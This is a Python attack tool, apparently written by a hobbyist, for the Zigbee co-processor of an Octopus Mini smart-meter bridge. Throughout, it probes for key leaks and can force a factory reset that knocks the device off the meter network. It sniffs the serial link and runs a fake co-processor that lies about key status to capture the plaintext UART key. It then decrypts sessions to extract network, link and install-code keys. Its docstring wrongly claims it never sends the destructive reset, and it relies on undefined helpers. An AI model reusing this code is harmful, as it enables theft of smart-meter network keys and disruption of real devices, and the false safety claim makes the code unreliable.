#!/usr/bin/env python3
"""ncptalk: minimal, SAFE ASH/EZSP host for talking directly to the MGM210P NCP
through the Pico ncpbridge. Built for one experiment: does the NCP answer normal
commands (and hand over the network key) BEFORE a Secure EZSP session is set up,
and does requesting a lower EZSP protocol version change that?

SAFETY: this only ever sends RST, ACKs, and a hardcoded whitelist of read-only
EZSP commands. It will refuse to transmit anything else. It never sends
setSecurityKey, leaveNetwork, resetToFactoryDefaults, key-table writes, or any
network-forming command, so it cannot knock the device off the meter HAN.

  ./ncptalk.py selftest cap_boot.bin      validate the codec offline (no hardware)
  ./ncptalk.py probe --version 8          run the live experiment at EZSP v8
  ./ncptalk.py probe --version 5          ...and try a downgraded version
"""
import argparse
import binascii
import sys
import time

# ---- EZSP command whitelist (frame id -> name). SENDING anything else raises. ----
ALLOWED = {
    0x00: "version",
    0xAA: "getValue",
    0x26: "getEui64",
    0x69: "getCurrentSecurityState",
    0x6A: "getKey",
    0xCD: "getSecurityKeyStatus",        # read-only, safe
    0xCC: "resetToFactoryDefaults",      # DESTRUCTIVE - enabled deliberately for reset-ncp
    0xCB: "setSecurityParameters",       # establishes a session (non-destructive)
}
VERSION_INFO = 0x11
CURRENT_NETWORK_KEY = 0x03

FLAG, ESC, SUB, XON, XOFF, CAN = 0x7E, 0x7D, 0x18, 0x11, 0x13, 0x1A
STUFF = {FLAG, ESC, XON, XOFF, SUB, CAN}

EZSP_STATUS = {0x00: "SUCCESS"}
EMBER_STATUS = {0x00: "SUCCESS", 0xB2: "NOT_JOINED?/EMBER_KEY_INVALID?",
                0x30: "EMBER_INVALID_CALL", 0x71: "EMBER_ERR_FATAL?"}


def crc(data):
    return binascii.crc_hqx(data, 0xFFFF).to_bytes(2, "big")


def randomize(data):
    """ASH data-field randomization LFSR (seed 0x42)."""
    out, r = bytearray(), 0x42
    for b in data:
        out.append(b ^ r)
        r = (r >> 1) ^ 0xB8 if r & 1 else r >> 1
    return bytes(out)


def stuff(frame):
    out = bytearray()
    for b in frame:
        if b in STUFF:
            out += bytes([ESC, b ^ 0x20])
        else:
            out.append(b)
    out.append(FLAG)
    return bytes(out)


def unstuff(frame):
    out, esc = bytearray(), False
    for b in frame:
        if esc:
            out.append(b ^ 0x20)
            esc = False
        elif b == ESC:
            esc = True
        else:
            out.append(b)
    return bytes(out)


# ---- ASH frame build/parse ----

def ash_rst():
    return bytes([CAN]) + stuff(bytes([0xC0]) + crc(bytes([0xC0])))


def ash_ack(ack_num):
    ctrl = 0x80 | (ack_num & 7)
    return stuff(bytes([ctrl]) + crc(bytes([ctrl])))


def ash_data(frm_num, ack_num, ezsp, re_tx=0):
    ctrl = (frm_num & 7) << 4 | (re_tx & 1) << 3 | (ack_num & 7)
    body = bytes([ctrl]) + randomize(ezsp)
    return stuff(body + crc(body))


def ash_parse(frame):
    """frame = raw bytes between flags (already unstuffed). Returns dict or None."""
    if len(frame) < 3:
        return None
    body, fcrc = frame[:-2], frame[-2:]
    if crc(body) != fcrc:
        return {"type": "bad-crc", "raw": frame}
    ctrl = body[0]
    if ctrl == 0xC0:
        return {"type": "RST"}
    if ctrl == 0xC1:
        return {"type": "RSTACK", "version": body[1], "reset": body[2]}
    if ctrl == 0xC2:
        return {"type": "ERROR", "version": body[1], "code": body[2]}
    if ctrl & 0x80 == 0:
        return {"type": "DATA", "frm": (ctrl >> 4) & 7, "re_tx": (ctrl >> 3) & 1,
                "ack": ctrl & 7, "ezsp": randomize(body[1:])}
    if ctrl & 0xE0 == 0x80:
        return {"type": "ACK", "ack": ctrl & 7}
    if ctrl & 0xE0 == 0xA0:
        return {"type": "NAK", "ack": ctrl & 7}
    return {"type": "ctrl", "ctrl": ctrl}


class AshReader:
    """Accumulates bytes, yields parsed frames on FLAG boundaries."""

    def __init__(self):
        self.buf = bytearray()

    def feed(self, data):
        frames = []
        for b in data:
            if b == FLAG:
                if self.buf:
                    frames.append(ash_parse(unstuff(bytes(self.buf))))
                self.buf.clear()
            elif b == CAN:
                self.buf.clear()
            elif b in (XON, XOFF):
                pass
            else:
                self.buf.append(b)
        return frames


# ---- EZSP frame build/parse ----

def ezsp_cmd(seq, frame_id, params=b"", version=8):
    if frame_id not in ALLOWED:
        raise RuntimeError(f"REFUSING to send non-whitelisted EZSP frame {frame_id:#04x}")
    if frame_id == 0x00:                       # version: always legacy format
        return bytes([seq, 0x00, 0x00]) + params
    if version >= 8:                           # v8+ extended format
        return bytes([seq, 0x00, 0x01, frame_id & 0xFF, frame_id >> 8]) + params
    return bytes([seq, 0x00, frame_id & 0xFF]) + params   # legacy for v<8


def ezsp_parse(d, version=8):
    if len(d) < 3:
        return {"seq": d[0] if d else None, "raw": d}
    seq, fc = d[0], d[1]
    if len(d) >= 5 and d[2] & 0x3F == 0x01:
        return {"seq": seq, "fc": fc, "fid": d[3] | d[4] << 8, "params": d[5:], "fmt": "v8+"}
    return {"seq": seq, "fc": fc, "fid": d[2], "params": d[3:], "fmt": "legacy"}


# ---- Live host over the bridge serial port ----

class Ncp:
    def __init__(self, port):
        import serial
        self.s = serial.Serial(port, 115200, timeout=0.05)
        self.rd = AshReader()
        self.tx = 0            # our next DATA frm_num
        self.rx = 0            # next expected NCP frm_num (=> ack_num we send)
        self.seq = 0           # EZSP sequence
        self.version = 8

    def _drain(self, dur=0.3):
        out, t0 = [], time.time()
        while time.time() - t0 < dur:
            d = self.s.read(256)
            if d:
                for f in self.rd.feed(d):
                    out.append(f)
                    t0 = time.time()
        return out

    def reset(self, dtr=True):
        self.s.setDTR(dtr)               # DTR controls NCP CTS polarity in the bridge
        time.sleep(0.05)
        self.s.reset_input_buffer()
        self.s.write(ash_rst())
        for f in self._drain(1.5):
            if f and f["type"] == "RSTACK":
                self.tx = self.rx = 0
                return f
            if f and f["type"] == "ERROR":
                return f
        return None

    def transact(self, frame_id, params=b"", label=""):
        ezsp = ezsp_cmd(self.seq, frame_id, params, self.version)
        self.s.write(ash_data(self.tx, self.rx, ezsp))
        my_frm = self.tx
        self.tx = (self.tx + 1) & 7
        self.seq = (self.seq + 1) & 0xFF
        resp = None
        t0 = time.time()
        while time.time() - t0 < 2.0:
            for f in self._drain(0.2):
                if not f:
                    continue
                if f["type"] == "DATA":
                    # ACK the NCP's data frame
                    self.rx = (f["frm"] + 1) & 7
                    self.s.write(ash_ack(self.rx))
                    resp = ezsp_parse(f["ezsp"], self.version)
                    return resp
                if f["type"] in ("ERROR",):
                    return {"error": f}
            time.sleep(0.02)
        return resp


def hexb(b):
    return b.hex(" ") if b else "(none)"


def show(label, r):
    if r is None:
        print(f"  {label:<26} -> NO RESPONSE (timeout)")
        return
    if "error" in r:
        print(f"  {label:<26} -> ASH {r['error']}")
        return
    fid = r.get("fid")
    p = r.get("params", b"")
    extra = ""
    if fid == 0x00 and len(p) >= 4:
        extra = f"protocolVersion={p[0]} stackType={p[1]} stackVer={p[3]:x}.{(p[2]>>4)&15}"
    elif fid == 0x6A:
        st = p[0] if p else None
        extra = f"status={EMBER_STATUS.get(st, hex(st))}"
        if st == 0x00 and len(p) >= 19:
            extra += f"  *** KEY BYTES: {p[-16:].hex()} ***"
    elif fid == 0x69:
        st = p[0] if p else None
        extra = f"status={EMBER_STATUS.get(st, hex(st))}"
    print(f"  {label:<26} -> fid={fid if fid is None else hex(fid)} {extra}  params={hexb(p)}")


def cmd_reset_ncp(args):
    """DESTRUCTIVE: impersonate the host and send resetToFactoryDefaults to the
    real NCP -> blanks its Secure-EZSP key token AND leaves the Zigbee network.
    Use ncpbridge_ht (ESP isolated). Confirms ALREADY_SET -> NOT_SET."""
    SEC_STATUS = {0x43: "ALREADY_SET", 0x47: "NOT_SET", 0x00: "SUCCESS"}
    ncp = Ncp(args.port)
    ncp.version = 8
    print(f"[reset-ncp] connecting to real NCP on {args.port} (ESP must be isolated)")
    rst = None
    for dtr in (True, False):
        rst = ncp.reset(dtr=dtr)
        if rst and rst.get("type") == "RSTACK":
            break
    if not rst or rst.get("type") != "RSTACK":
        print("  no RSTACK - NCP not reachable / not powered / wrong wiring. Aborting.")
        return
    print(f"  RSTACK ok: {rst}")
    show("version", ncp.transact(0x00, bytes([8])))

    r = ncp.transact(0xCD)                         # getSecurityKeyStatus (before)
    st = r.get("params", b"")[0] if r and r.get("params") else None
    print(f"  BEFORE: getSecurityKeyStatus -> {SEC_STATUS.get(st, hex(st) if st is not None else '?')}")
    if st == 0x47:
        print("  NCP already NOT_SET (blank). Nothing to reset; proceed to capture phase.")
        return
    if not args.force:
        print("\n  *** This will call resetToFactoryDefaults: the NCP will LEAVE the meter HAN")
        print("  *** and blank its Secure-EZSP key. Re-run with --force to actually send it.")
        return

    print("  >>> sending resetToFactoryDefaults (0xCC) ...")
    r = ncp.transact(0xCC)
    st = r.get("params", b"")[0] if r and r.get("params") else None
    print(f"  resetToFactoryDefaults -> status {SEC_STATUS.get(st, hex(st) if st is not None else '(no resp)')}")

    time.sleep(0.3)
    r = ncp.transact(0xCD)                         # getSecurityKeyStatus (after)
    st = r.get("params", b"")[0] if r and r.get("params") else None
    after = SEC_STATUS.get(st, hex(st) if st is not None else "?")
    print(f"  AFTER:  getSecurityKeyStatus -> {after}")
    if st == 0x47:
        print("\n  *** NCP BLANKED. Now: reflash passthru, power-cycle, and capture the ESP")
        print("  *** re-provisioning it with a PLAINTEXT setSecurityKey.  Then re-add via the app.")
    else:
        print("  (unexpected: NCP did not report NOT_SET; it may reset state only after reboot)")


def cmd_secure_query(args):
    """Establish a Secure-EZSP session with the real NCP using a KNOWN UART key
    and read out keys/params. Use ncpbridge_ht (ESP isolated). Reads the network
    key (getKey type 3), TC link key (type 1), network params, security state."""
    import os
    key = bytes.fromhex(args.key.replace(" ", ""))
    if len(key) != 16:
        sys.exit("key must be 16 bytes")
    sk = _load(HERE_DIR + "/sekey.py", "sekey")
    KT = {1: "TRUST_CENTER_LINK_KEY", 3: "CURRENT_NETWORK_KEY", 4: "NEXT_NETWORK_KEY",
          5: "APPLICATION_LINK_KEY"}
    ncp = Ncp(args.port)
    ncp.version = 8
    print(f"[secure-query] using UART key {key.hex()} on {args.port} (ESP isolated)")
    rst = None
    for dtr in (True, False):
        rst = ncp.reset(dtr=dtr)
        if rst and rst.get("type") == "RSTACK":
            break
    if not rst or rst.get("type") != "RSTACK":
        print("  no RSTACK - NCP unreachable. Aborting."); return
    ncp.transact(0x00, bytes([8]))                       # version
    r = ncp.transact(0xCD)                               # getSecurityKeyStatus
    st = r.get("params", b"")[0] if r and r.get("params") else None
    print(f"  getSecurityKeyStatus -> {'ALREADY_SET' if st==0x43 else 'NOT_SET' if st==0x47 else hex(st) if st is not None else '?'}")
    if st != 0x43:
        print("  NCP has no key set — the ESP must provision first, or run this with the right key."); return

    host_rand = os.urandom(16)
    r = ncp.transact(0xCB, bytes([0x05]) + host_rand)    # setSecurityParameters
    p = r.get("params", b"") if r else b""
    if len(p) < 17 or p[0] != 0x00:
        print(f"  setSecurityParameters failed: {p.hex() if p else '(no resp)'}"); return
    ncp_rand = p[1:17]
    host_sid, ncp_sid = sk.session_ids(key, host_rand, ncp_rand)
    print(f"  SECURE SESSION UP (hostSid={host_sid.hex()} ncpSid={ncp_sid.hex()})")

    out_ctr = [0]

    def secure_query(fid, qparams=b""):
        plain = bytes([fid & 0xFF, fid >> 8]) + qparams
        frame = sk.ccm_encrypt(key, host_sid, out_ctr[0], ncp.seq, plain, fc_lb=0x00)
        out_ctr[0] += 1
        ncp.s.write(ash_data(ncp.tx, ncp.rx, frame))
        ncp.tx = (ncp.tx + 1) & 7
        ncp.seq = (ncp.seq + 1) & 0xFF
        t0 = time.time()
        while time.time() - t0 < 2.0:
            for f in ncp._drain(0.2):
                if f and f["type"] == "DATA":
                    ncp.rx = (f["frm"] + 1) & 7
                    ncp.s.write(ash_ack(ncp.rx))
                    return sk.ccm_decrypt(key, f["ezsp"])
        return None

    def show_key(label, pt):
        if not pt or len(pt) < 22:
            print(f"  {label}: no/short response ({pt.hex() if pt else 'none'})"); return
        status, ktype, kbytes = pt[2], pt[5], pt[6:22]
        print(f"  {label}: status={status:#04x} type={ktype}({KT.get(ktype,'?')})  KEY={kbytes.hex()}")

    print("\n  === reading keys from the NCP ===")
    show_key("network key (type 3)", secure_query(0x6A, bytes([3])))
    show_key("TC link key (type 1)", secure_query(0x6A, bytes([1])))
    np = secure_query(0x28)                              # getNetworkParameters
    if np and len(np) >= 4:
        pr = np[2:]
        print(f"  getNetworkParameters: status={pr[0]:#04x} nodeType={pr[1]} "
              f"params={pr[2:].hex()}")
    ss = secure_query(0x69)                              # getCurrentSecurityState
    if ss:
        print(f"  getCurrentSecurityState: {ss[2:].hex()}")
    print("\n  network key (type 3) above = the HAN NWK-layer key that decrypts meter traffic.")


def cmd_probe(args):
    ncp = Ncp(args.port)
    ncp.version = args.version
    print(f"[ncptalk] connecting to NCP on {args.port}, requesting EZSP v{args.version}")
    rst = None
    for dtr in (True, False):
        rst = ncp.reset(dtr=dtr)
        print(f"  RST (CTS {'low/asserted' if dtr else 'high'}) -> {rst}")
        if rst and rst.get("type") == "RSTACK":
            break
    if not rst or rst.get("type") != "RSTACK":
        print("  No RSTACK on either CTS polarity. Is the Octopus Mini powered and the NCP wired? Aborting.")
        return
    show("version", ncp.transact(0x00, bytes([args.version])))
    print("  --- the actual test: normal + key-read commands with NO Secure EZSP session ---")
    show("getValue(VERSION_INFO)", ncp.transact(0xAA, bytes([VERSION_INFO])))
    show("getEui64", ncp.transact(0x26))
    show("getCurrentSecurityState", ncp.transact(0x69))
    show("getKey(CURRENT_NETWORK_KEY)", ncp.transact(0x6A, bytes([CURRENT_NETWORK_KEY])))
    print("  (SUCCESS + key bytes above = jackpot; an error/timeout = the NCP enforces Secure EZSP)")


def cmd_selftest(args):
    """Validate the ASH/EZSP codec against a real capture, no hardware."""
    sys.argv = [sys.argv[0]]
    import importlib.util
    spec = importlib.util.spec_from_file_location("sniff",
        __file__.rsplit("/", 1)[0] + "/sniff.py")
    sniff = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(sniff)

    rate, events = sniff.load_capture(args.file)
    # Reconstruct each UART byte stream (ch1 = ZB_RX = host->NCP, ch0 = ZB_TX = NCP->host)
    streams = {0: [], 1: []}
    decs = []
    for ch in (0, 1):
        decs.append(sniff.UartDecoder(ch, rate, 115200,
                    lambda c, t, v, e, ch=ch: streams[ch].append(v)))
    disp = sniff.Dispatcher(decs)
    for t, c in events:
        disp.event(t, c)
    for d in decs:
        d.tick(1 << 62)

    for ch, who in ((1, "host->NCP"), (0, "NCP->host")):
        rd = AshReader()
        frames = rd.feed(bytes(streams[ch]))
        good = [f for f in frames if f and f["type"] not in ("bad-crc",)]
        bad = [f for f in frames if f and f["type"] == "bad-crc"]
        print(f"\n{who}: {len(streams[ch])} bytes, {len(good)} good ASH frames, {len(bad)} bad-crc")
        for f in frames[:8]:
            if not f:
                continue
            if f["type"] == "DATA":
                e = ezsp_parse(f["ezsp"])
                nm = ALLOWED.get(e.get("fid"), sniff.EZSP_NAMES.get(e.get("fid"), "?"))
                print(f"   DATA frm={f['frm']} ack={f['ack']} ezsp={hexb(f['ezsp'][:12])} "
                      f"-> fid={e.get('fid') and hex(e['fid'])} {nm}")
            else:
                print(f"   {f}")
    # Round-trip check: re-encode a version command and confirm it parses back.
    v = ezsp_cmd(0, 0x00, bytes([8]))
    framed = ash_data(0, 0, v)
    back = ash_parse(unstuff(framed[:-1]))
    assert back["type"] == "DATA" and back["ezsp"] == v, "round-trip failed"
    print("\nround-trip encode/decode of version cmd: OK")


def cmd_monitor(args):
    """Passively decode the passthru MITM log (tagged byte-pairs) live."""
    import serial
    try:
        with open(__file__.rsplit("/", 1)[0] + "/ezsp_ids.json") as f:
            import json
            names = {int(k, 16): v for k, v in json.load(f).items()}
    except OSError:
        names = {}
    s = serial.Serial(args.port, 115200, timeout=0.1)
    rawf = open(args.out, "wb") if getattr(args, "out", None) else None
    rd = {0x00: AshReader(), 0x01: AshReader()}
    label = {0x00: "ESP->NCP", 0x01: "NCP->ESP"}
    dbg = bytearray()
    pend = bytearray()
    print(f"[monitor] logging MITM traffic on {args.port}. Power on the Mini. Ctrl-C to stop.")
    if rawf:
        print(f"[monitor] saving raw tagged stream to {args.out} (decode later with: passthru-decrypt {args.out})")
    t0 = time.time()
    try:
        while True:
            d = s.read(512)
            if not d:
                continue
            if rawf:
                rawf.write(d); rawf.flush()
            pend += d
            while len(pend) >= 2:
                dirb, byte = pend[0], pend[1]
                del pend[:2]
                if dirb == 0x02:                 # ESP debug console text
                    if byte == 0x0A:
                        line = dbg.decode("utf-8", "replace").rstrip("\r")
                        print(f"{time.time()-t0:8.3f} ESP.console  {line}")
                        dbg.clear()
                    elif byte != 0x0D:
                        dbg.append(byte)
                    continue
                if dirb == 0x03:                 # mirrors-engaged marker
                    print(f"{time.time()-t0:8.3f} *** MIRRORS ENGAGED (bridge now driving) ***")
                    continue
                if dirb == 0x05:                 # version rewrite event (old,new)
                    print(f"{time.time()-t0:8.3f} >>> VERSION REWRITE byte = {byte} (0x{byte:02x})")
                    continue
                if dirb == 0x04:                 # flow-line snapshot
                    gp4, gp11 = byte & 1, (byte >> 1) & 1
                    eng = (byte >> 4) & 1; pull = "UP" if (byte >> 5) & 1 else "DN"
                    print(f"{time.time()-t0:8.3f} FLOW pull={pull}  GP4={gp4} GP11={gp11} eng={eng}")
                    continue
                if dirb not in rd:
                    del pend[:1]        # resync on bad tag
                    continue
                for f in rd[dirb].feed(bytes([byte])):
                    if not f:
                        continue
                    ts = time.time() - t0
                    if f["type"] == "DATA":
                        e = ezsp_parse(f["ezsp"])
                        fid = e.get("fid")
                        nm = names.get(fid, ALLOWED.get(fid, "?"))
                        sec = " SECURE" if len(f["ezsp"]) > 2 and f["ezsp"][2] & 0x80 else ""
                        # plaintext setSecurityKey on the wire = the real UART key!
                        if dirb == 0x00 and fid == SET_SECURITY_KEY_ID and not sec:
                            key = bytes(e.get("params", b"")[:16])
                            print("\n" + "=" * 68)
                            print(f"*** PLAINTEXT setSecurityKey CAPTURED -- UART KEY = {key.hex()} ***")
                            print(f"*** decrypt this capture: passthru-decrypt <file> --key {key.hex()} ***")
                            print("=" * 68 + "\n")
                        print(f"{ts:8.3f} {label[dirb]}  DATA frm={f['frm']} ack={f['ack']}"
                              f"  fid={fid and hex(fid)} {nm}{sec}  {f['ezsp'][:16].hex(' ')}")
                    elif f["type"] in ("RST", "RSTACK", "ERROR", "NAK"):
                        print(f"{ts:8.3f} {label[dirb]}  {f}")
                    # ACKs are frequent/noisy; skip
    except KeyboardInterrupt:
        print("\nstopped.")
    finally:
        if rawf:
            rawf.close()
        s.close()


def _detag_passthru(path):
    """Split a saved passthru raw stream ([dir,byte] pairs) into the two ASH
    byte streams. Returns (esp2ncp_bytes, ncp2esp_bytes, console_text)."""
    data = open(path, "rb").read()
    esp2ncp, ncp2esp, console = bytearray(), bytearray(), bytearray()
    i = 0
    while i + 1 < len(data):
        dirb, byte = data[i], data[i + 1]
        if dirb == 0x00:
            esp2ncp.append(byte); i += 2
        elif dirb == 0x01:
            ncp2esp.append(byte); i += 2
        elif dirb == 0x02:
            console.append(byte); i += 2
        elif dirb in (0x03, 0x04, 0x05):
            i += 2                       # markers (some carry a payload byte)
        else:
            i += 1                       # resync on bad tag
    return bytes(esp2ncp), bytes(ncp2esp), bytes(console)


def cmd_passthru_decrypt(args):
    """Offline-decode a saved passthru capture: find the plaintext setSecurityKey,
    then decrypt the whole Secure EZSP session and flag key material."""
    sk = _load(HERE_DIR + "/sekey.py", "sekey")
    names = _ezsp_names()
    esp2ncp, ncp2esp, _ = _detag_passthru(args.file)

    # 1) recover the UART key: scan ESP->NCP for a plaintext setSecurityKey(0xCA)
    key = bytes.fromhex(args.key.replace(" ", "")) if args.key else None
    if key is None:
        rd = AshReader()
        for f in rd.feed(esp2ncp):
            if f and f["type"] == "DATA":
                e = ezsp_parse(f["ezsp"])
                if e.get("fid") == SET_SECURITY_KEY_ID and not (f["ezsp"][2] & 0x80 if len(f["ezsp"]) > 2 else 0):
                    key = bytes(e.get("params", b"")[:16])
                    print(f"[+] recovered plaintext UART key from setSecurityKey: {key.hex()}")
                    break
    if key is None:
        print("[-] no plaintext setSecurityKey found (NCP was not blank -> session not decryptable).")
        print("    The re-add did not reset the NCP. A factory reset is needed to put the key on the wire.")
        return
    if len(key) != 16:
        sys.exit("key must be 16 bytes")

    # 2) decrypt both directions
    n_ok = n_fail = 0
    for stream, who in ((esp2ncp, "ESP->NCP"), (ncp2esp, "NCP->ESP")):
        rd = AshReader()
        for f in rd.feed(stream):
            if not f or f["type"] != "DATA":
                continue
            ez = f["ezsp"]
            if len(ez) < 3 or not (ez[2] & 0x80):     # only secure frames
                continue
            pt = sk.ccm_decrypt(key, ez)
            if pt is None:
                n_fail += 1
                continue
            n_ok += 1
            fid = pt[0] | pt[1] << 8
            params = bytes(pt[2:])
            nm = names.get(fid, f"id_{fid:#06x}")
            flag = ""
            if fid == 0x0B:                                   # getMfgToken response? (cmd)
                flag = ""
            if fid in (0x68, 0x66, 0x67, 0x6A):
                flag = "  <<< KEY-BEARING"
            print(f"{who}  fid={hex(fid)} {nm}{flag}  {params.hex(' ')}")
            if fid == 0x68:
                info = _parse_initial_security_state(params)
                if info:
                    print("    setInitialSecurityState:", info)
    # 3) hunt the install code: getMfgToken(0x0A) response comes back NCP->ESP.
    #    Its request is ESP->NCP fid 0x0B param 0x0A; the response carries the token bytes.
    print(f"\ndecrypted {n_ok} secure frames, {n_fail} MIC failures.")
    print("Look above for: getMfgToken (0x0b, param 0x0a = INSTALL CODE), getKey (0x6a = network key),")
    print("setInitialSecurityState (0x68). Install-code token response = the golden ticket for a CAD.")


# ---- Fake NCP: impersonate the MGM210P toward the ESP32 host ----
#
# We replay the real NCP's boot responses (captured from cap_boot.bin) so the
# ESP's EZSP init proceeds, then on getSecurityKeyStatus we LIE "KEY_NOT_SET"
# (0x47) instead of the truthful "ALREADY_SET" (0x43). If the host firmware
# provisions on not-set, it will send setSecurityKey (0xCA) with the 16-byte
# key in PLAINTEXT -- we capture it and then return a non-success status so the
# host aborts and never overwrites its own key token (non-destructive).
#
# SAFETY: there is no real NCP on the wire here; the ESP talks only to us. We
# only ever emit RSTACK, ACK, benign read responses, the one status lie, and an
# error reply to setSecurityKey. We never send any state-changing EZSP command.

SET_SECURITY_KEY_ID = 0xCA           # its first 16 param bytes are the key
GET_SECURITY_KEY_STATUS_ID = 0xCD
SET_SECURITY_PARAMETERS_ID = 0xCB

# De-randomized EZSP responses WITHOUT the leading seq byte (seq is echoed from
# the command). Captured verbatim from cap_boot.bin except the 0xCD lie.
NCP_RSP = {
    0x00: bytes.fromhex("800008029067"),               # version -> protoVer8, stack 02/9067 (legacy fmt)
    0xAA: bytes.fromhex("8001aa000007950106070900aa"),  # getValue(VERSION_INFO)
    0xCD: bytes.fromhex("8001cd004700000000"),          # getSecurityKeyStatus -> LIE: 0x47 NOT_SET
}
# Reply we send to setSecurityKey: extended fmt, status 0x44 (SECURITY_TYPE_INVALID)
# -> host sees failure, does NOT commit the key to its token.
SET_KEY_FAIL_TAIL = bytes.fromhex("8001ca0044")


def ash_rstack(version=0x02, reset=0x0B):
    body = bytes([0xC1, version, reset])
    return stuff(body + crc(body))


class FakeNcp:
    def __init__(self, port):
        import serial
        self.s = serial.Serial(port, 115200, timeout=0.02)
        self.rd = AshReader()
        self.rx = 0          # next expected host frm (== ackNum we send back)
        self.tx = 0          # our next DATA frm
        self.last_sent = b""  # for retransmit on duplicate host DATA
        self.captured_key = None
        # secure-session state
        self.sk = _load(HERE_DIR + "/sekey.py", "sekey")
        self.key = None
        self.ncp_sid = None
        self.host_sid = None
        self.ncp_ctr = 0
        self.secured = False
        self.cfg = {}         # configId -> value16 (echoed back on getConfigurationValue)
        self.cb_seq = 0x80    # sequence for unsolicited callbacks

    def rstack(self):
        self.s.write(ash_rstack())
        self.rx = self.tx = 0
        self.last_sent = b""
        self.secured = False
        self.ncp_ctr = 0

    def send_data(self, ezsp):
        frame = ash_data(self.tx, self.rx, ezsp)
        self.s.write(frame)
        self.last_sent = frame
        self.tx = (self.tx + 1) & 7

    def bare_ack(self):
        self.s.write(ash_ack(self.rx))

    def send_secure(self, seq, plain, fc_lb=0x80):
        """Encrypt plain (frameId+params) under ncpSid/ctr and send as ASH DATA."""
        frame = self.sk.ccm_encrypt(self.key, self.ncp_sid, self.ncp_ctr, seq, plain, fc_lb)
        self.ncp_ctr += 1
        self.send_data(frame)

    def send_callback(self, fid, params=b""):
        # async callbacks carry frame-control RESPONSE|ASYNCH_CB = 0x90
        plain = bytes([fid & 0xFF, fid >> 8]) + params
        self.send_secure(self.cb_seq, plain, fc_lb=0x90)
        self.cb_seq = (self.cb_seq + 1) & 0xFF

    def sec_reply(self, fid, params):
        """Return a well-formed EZSP response payload (frameId(2) + params) for a
        secure command, so the ESP's init completes and reaches the network phase."""
        import os
        hdr = bytes([fid & 0xFF, fid >> 8])

        def r(*p):
            return hdr + bytes(p)

        if fid == 0x53:                       # setConfigurationValue: track + status
            if len(params) >= 3:
                self.cfg[params[0]] = params[1] | params[2] << 8
            return r(0x00)
        if fid == 0x52:                       # getConfigurationValue: status + value16
            cid = params[0] if params else 0
            v = self.cfg.get(cid, 0)
            return r(0x00, v & 0xFF, (v >> 8) & 0xFF)
        if fid == 0x49:                       # getRandomNumber: status + value16
            v = os.urandom(2)
            return r(0x00, v[0], v[1])
        if fid == 0xAA:                       # getValue: status + len + value
            vid = params[0] if params else 0
            if vid == 0x11:
                val = bytes.fromhex("950106070900aa")
                return r(0x00, len(val)) + val
            return r(0x00, 0x00)
        if fid == 0x15:                       # setManufacturerCode: void
            return hdr
        if fid == 0x18:                       # networkState: EMBER_NO_NETWORK
            return r(0x00)
        if fid == 0x17:                       # networkInit: NOT_JOINED -> provoke provision
            return r(0x93)
        if fid == 0x28:                       # getNetworkParameters: status + nodeType + struct(20)
            return r(0x93, 0x00) + bytes(20)
        # status-only commands: setValue, setPolicy, addEndpoint, setInitialSecurityState,
        # formNetwork, joinNetwork, addOrUpdateKeyTableEntry, becomeTrustCenter, etc.
        return r(0x00)


def _ezsp_names():
    try:
        import json
        with open(HERE_DIR + "/ezsp_ids.json") as f:
            return {int(k, 16): v for k, v in json.load(f).items()}
    except Exception:
        return {}


# Commands whose params carry key material -- flag loudly if the host sends them.
KEY_BEARING = {0x68: "setInitialSecurityState", 0x66: "addOrUpdateKeyTableEntry",
               0x67: "sendTrustCenterLinkKey", 0xAB: "setValue", 0x6A: "getKey"}


def _parse_initial_security_state(params):
    # EmberInitialSecurityState: bitmask(2) preconfiguredKey(16) networkKey(16)
    #   networkKeySequenceNumber(1) preconfiguredTrustCenterEui64(8)
    if len(params) < 2 + 16 + 16 + 1:
        return None
    return {
        "bitmask": int.from_bytes(params[0:2], "little"),
        "preconfigured/TC-link key": params[2:18].hex(),
        "networkKey": params[18:34].hex(),
        "networkKeySeq": params[34],
    }


def cmd_fakencp(args):
    import os
    fn = FakeNcp(args.port)
    names = _ezsp_names()
    print(f"[fakencp] impersonating the NCP on {args.port}. Power on the Octopus Mini now.")
    mode = "COMPLETE session (accept key)" if args.complete else "ABORT after key capture"
    print(f"          mode: {mode}; lie NOT_SET on getSecurityKeyStatus.")
    logf = open(args.out, "a") if args.out else None
    fn.rstack()
    t0 = time.time()
    done = False

    def log(msg):
        print(msg)
        if logf:
            logf.write(msg + "\n")
            logf.flush()

    try:
        while not done:
            d = fn.s.read(256)
            if not d:
                continue
            for f in fn.rd.feed(d):
                if not f:
                    continue
                ts = time.time() - t0
                ty = f["type"]
                if ty == "RST":
                    log(f"{ts:8.3f} host RST -> RSTACK, reset sequence")
                    fn.rstack()
                    continue
                if ty in ("ACK", "NAK"):
                    if ty == "NAK" and fn.last_sent:
                        fn.s.write(fn.last_sent)
                    continue
                if ty == "bad-crc":
                    log(f"{ts:8.3f} host bad-crc (ignored)")
                    continue
                if ty != "DATA":
                    log(f"{ts:8.3f} host {f}")
                    continue

                if f["frm"] != fn.rx:                 # duplicate/out-of-order
                    fn.bare_ack()
                    if fn.last_sent:
                        fn.s.write(fn.last_sent)
                    continue
                fn.rx = (f["frm"] + 1) & 7
                seq = f["ezsp"][0]

                # ---- secure phase: decrypt, log, and reply with an encrypted frame ----
                if fn.secured:
                    pt = fn.sk.ccm_decrypt(fn.key, f["ezsp"])
                    if pt is None:
                        log(f"{ts:8.3f} [secure] MIC FAIL / undecryptable (ctr desync?)")
                        continue
                    fid = pt[0] | pt[1] << 8
                    params = bytes(pt[2:])
                    nm = names.get(fid, "?")
                    flag = "  <<< KEY-BEARING" if fid in KEY_BEARING else ""
                    log(f"{ts:8.3f} [secure] host fid={hex(fid)} {nm}{flag}  params={hexb(params)}")
                    if fid == 0x68:                    # setInitialSecurityState
                        info = _parse_initial_security_state(params)
                        if info:
                            log("\n" + "#" * 70)
                            log("### setInitialSecurityState DECRYPTED -- Zigbee keys in clear:")
                            for k, v in info.items():
                                log(f"###   {k} = {v}")
                            log("#" * 70 + "\n")
                    elif fid == 0x66 and len(params) >= 24:  # addOrUpdateKeyTableEntry
                        log("\n" + "#" * 70)
                        log(f"### addOrUpdateKeyTableEntry -- eui64={params[0:8].hex()} "
                            f"key={params[8:24].hex()}")
                        log("#" * 70 + "\n")
                    plain = fn.sec_reply(fid, params)
                    fn.send_secure(seq, plain)
                    # drive the join flow forward with faked async callbacks
                    if fid == 0x1A:                    # startScan (active) -> fake a network
                        ch = 11
                        if len(params) >= 5:
                            mask = int.from_bytes(params[1:5], "little")
                            ch = next((b for b in range(11, 27) if mask & (1 << b)), 11)
